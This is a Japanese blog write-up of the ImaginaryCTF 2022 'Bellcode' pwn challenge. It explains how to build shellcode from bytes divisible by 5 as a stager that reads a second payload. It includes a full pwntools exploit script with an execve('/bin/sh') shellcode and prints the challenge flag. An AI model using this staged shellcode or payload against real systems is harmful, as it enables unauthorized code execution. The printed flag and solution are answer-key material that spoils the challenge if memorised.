+++
title = "Imaginary CTF 2022 - Bellcode"
date = 2022-07-19

[taxonomies]
tags = ["CTF", "Writeup", "Pwn", "shellcode", "stager"]
+++

## TL;DR

- 5の倍数のバイトだけが使えるシェルコード
- こんなカスみたいな制限で書いてられないのでなんとかして`read(0, buf, size)`をするだけのコードを書いて`buf`に無制限のシェルコードを流し込む
- `buf`へ飛ぶ

## Prerequisite

- stager: 別のシェルコードを読み込んで飛ぶためのコードを書いて、それを利用して別のシェルコードを書き込む手法

## Writeup

checksecは以下の通り

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

ソースが無いので頑張ってGhidraで読むとだいたい次のような事をすることがわかる

1. `mmap`でアドレス`0xfac300`にRWX領域を確保し、そこに制約付き(後述)で0x1000バイトの書き込みが出来る
2. この領域へjmpする

1で言及した制約が結構厄介で、具体的には各入力バイト`c`に対して、次のような処理(Pythonで書き直した)を施した後、`ecx`が0である必要がある。

```python
ecx = c
edx = c
eax = edx
eax <<= 2
eax += edx
eax <<= 3
eax += edx
edx = eax * 4
eax += edx
eax >>= 8
edx = eax
edx >>= 2
eax = edx
eax <<= 2
eax += edx
ecx -= eax
```

`c`を総当りして確かめると実はこのコードは`ecx = c mod 5`を計算していることがわかる。よって、`ecx = 0 mod 5`が要求されることから、この問題は「5の倍数のバイトのみからなるシェルコードを書く」問題となる。

この~~カスみたいな~~制約のせいでまともなシェルコードを書くのは諦め、代わりに`read(0, buf, size)`をしてから`buf`に飛ぶシェルコードを書く。これで、`read`が呼ばれた時に特に制限の無いシェルコードを送る事が出来る。

ひとまず使えそうな命令を探すが、PIE有効な上に、libcのアドレスがわかっているわけでも無いのでやりたいことをやるためには何よりシステムコールを呼ぶ必要がある。幸いにも`syscall`に対応する機械語は`0f 05`でどちらも5の倍数であるから使う事が出来る[^1]。

`read(0, buf, size)`をやるためにはシステムコールで使う`rax`に加えて`rdi, rsi, rdx`に上手く値を設定する必要がある。そこでまずは各種文献を漁って使えそうなオペコードを探す。それに対して適当に5の倍数のバイトを総当りしてオペランドとして付与したものをCapstoneでディスアセンブルし、使えそうな命令を探す。

ただ、残念な事に64bitのレジスタを使う多くの命令は先頭に64bitの命令である事を示すprefixのようなものが必要らしい("REX.W"などと言うらしい)。`pop rdi`のように汎用的な命令はそれが必要ないみたいだが、このせいで使えるオペコードでも、64bitでは使えなくなるものがある。

更に残念なお知らせとして、`mov`や`lea`は大抵が使えないか使えたとしても32bitの値すら値を扱えないようである。となると値を設定する方法として考えられるのは論理/四則演算で上手くレジスタに入れた値を`xchg`や`push`と`pop`で別のレジスタに入れるといった方法になる。

逆に良いお知らせとしては`jmp`や`call`系の命令はレジスタを引数として(ここ重要)`ff`から始まるものがあったのでこれを使う事が出来る。というわけで、`read(0, buf, size)`だけを実行出来れば特に問題がなさそうである。

Capstoneによるディスアセンブル総当り、逆に使えそうな命令のアセンブルを繰り返して見つかった使えそうな命令は次の通り。

```
<CsInsn 0x0 [ffd2]: call rdx>
<CsInsn 0x0 [ffd7]: call rdi>
<CsInsn 0x0 [ffe1]: jmp rcx>
<CsInsn 0x0 [ffe6]: jmp rsi>
<CsInsn 0x0 [5a]: pop rdx>
<CsInsn 0x0 [5f]: pop rdi>
<CsInsn 0x0 [415a]: pop r10>
<CsInsn 0x0 [4b5f]: pop r15>
<CsInsn 0x0 [4b55]: push r13>
<CsInsn 0x0 [50]: push rax>
<CsInsn 0x0 [55]: push rbp>
<CsInsn 0x0 [91]: xchg eax, ecx>
<CsInsn 0x0 [96]: xchg eax, esi>
<CsInsn 0x0 [87c3]: xchg ebx, eax>
<CsInsn 0x0 [05deadbeef]: add eax, 0xefbeadde> # eaxにvalidなバイトからなる値を設定
<CsInsn 0x0 [c3]: ret > # ROPと同じ要領でいける
<CsInsn 0x0 [0fafc3]: imul eax, ebx>
```

言い忘れていたが、本問題において重要な点として、シェルコード実行時、`rax`には0が入っている。これを踏まえると次のような事が出来る。

1. `rax = 0`の時、`add eax, <imm>`によって、32bitの任意の値を`rax`または`eax`に入れることが出来る
2. 1で入れた値を`xchg eax, esi`, `schg eax, ecx`, `xchg ebx, eax`によって`esi, ecx, ebx`に入れることが出来る
3. `push rax`によって1で入れた値をスタックに積むことが出来る
4. 3で積んだ値を`pop <reg>`によって`rdx, rdi, r10, r15`に入れる事が出来る

普通にこれらをやるだけでは1の`rax = 0`という条件がある以上、上手くいかない。ここで前述の`xchg`を`eax`にも値を設定出来る命令と考えると、別のレジスタに0を設定してそいつを利用出来ないかという事が考えられる。

実際これは可能で、`imul eax, ebx`が存在していることから、`xchg ebx, eax`によって`ebx = 0`とし、後に`imul eax, ebx`を実行すれば再び`eax = 0`と出来る。これで1の`add`による任意の値の設定を何度でも行う事が出来る。

ここまでくれば後は簡単でこれを利用して、`rdi/edi`と`rsi/esi`, `rdx/edx`に値を入れるだけである。`rsi/esi`に関しては`read(0, buf, size)`の`buf`に相当し、後にシェルコードを流し込まれる場所となるので同じくRWX領域であり、validなバイトからなるアドレスの`0xfac800`を指定した。

`rdx`に関しては`size`に相当するので、大きい値であれば特に問題はない。ここに値を直接設定する目ぼしい命令が見つからなかったが、手元の環境ではシェルコード実行時に割と大きい値が入っていたのでそのまま利用した。

これで`read(0, buf, size)`が無事に実行出来てシェルコードを流し込む事が出来る。その後は`jmp rsi`を`rsi = buf`の時に実行してシェルコードへ飛ぶ。シェルコードの読み込みが終了した後は残念ながら`rax`は0では無いが[^2]、`rbx`が0なのはそのままだったので前述の手法で`eax`を0にすることが出来る。よって、先程`esi`に`buf`を設定したのと同様にして`esi = buf`とし、`jmp rsi`を実行すれば、書き込んでおいたシェルコードが実行される。

なお、`read`で書き込んだシェルコードは他人のやつを適当にパクって動いたものを使った[^3]。

## Code

```python
from pwn import remote, p32
import sys


DEBUG = "-d" in sys.argv

if DEBUG:
    sc = remote("localhost", 13337)
else:
    sc = remote("bellcode.chal.imaginaryctf.org", 1337)

sc.recvuntil(b"shellcode?\n")



# read(0, buf, size)
shellcode = b""
# set rbx = 0 (for rax = 0 by imul eax, ebx)
shellcode += b"\x87\xc3"      # xchg ebx, eax
shellcode += b"\x0f\xaf\xc3"  # imul eax, ebx
# set rdi = 0
shellcode += b"\x50"  # push rax
shellcode += b"\x5f"  # pop rdi
# set rsi(esi) = buf
second_stage_addr = 0xfac800
shellcode += b"\x05" + p32(second_stage_addr) # add eax, 0xfac800
shellcode += b"\x96"  # xchg eax, esi
# set edx = 0x100 (enough number)
# pass
# set rax = 0
shellcode += b"\x0f\xaf\xc3"
# syscall
shellcode += b"\x0f\x05"  # syscall

# jump shellcode
# set eax = buf
shellcode += b"\x87\xc3"  # xchg ebx, eax (for rax = 0)
shellcode += b"\x05" + p32(second_stage_addr)
# set rdi = rax
shellcode += b"\x96"      # xchg eax, esi
shellcode += b"\xff\xe6"  # jmp rsi

sc.sendline(shellcode)
print(sc.recvline())

print("[+] send 1st")

if DEBUG:
    input("[+] attaching...")

# stolen from: https://inaz2.hatenablog.com/entry/2014/07/04/001851
shellcode2 = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
sc.sendline(shellcode2)

print("[+] send 2nd")

sc.interactive()
```

## Flag

`ictf{did_mod_5_ring_a_bell_be00c3fa}`

## References

- [x86 and amd64 instruction reference](https://www.felixcloutier.com/x86/index.html)
- [x64でスタックバッファオーバーフローをやってみる - ももいろテクノロジー](https://inaz2.hatenablog.com/entry/2014/07/04/001851): ここに記載されているシェルコードを利用

---

[^1]: そもそも`syscall`すら実行出来ないなら(自己書き換えを除いて)解けないと思う。自己書き換えをするにもスタックのアドレスが必要で、`rsp`を上手く利用するという曲芸になりそう

[^2]: 確か`rcx`もどこかのアドレスが入るらしいが、具体的な値の特徴は忘れた

[^3]: ももいろテクノロジー様、いつもお世話になっています
